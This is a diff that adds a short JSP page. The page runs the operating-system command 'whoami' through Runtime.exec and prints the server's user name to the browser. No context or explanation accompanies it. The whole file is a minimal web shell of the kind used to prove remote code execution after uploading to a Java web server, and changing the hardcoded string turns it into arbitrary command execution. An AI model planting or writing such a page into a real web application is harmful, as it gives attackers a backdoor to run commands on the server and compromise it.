@@ -1,0 +1,7 @@
+<%@ page import="java.util.*,java.io.*"%>
+<%
+    
+    Process p = Runtime.getRuntime().exec("whoami");
+    BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
+    out.println("Server User: " + in.readLine());
+%>
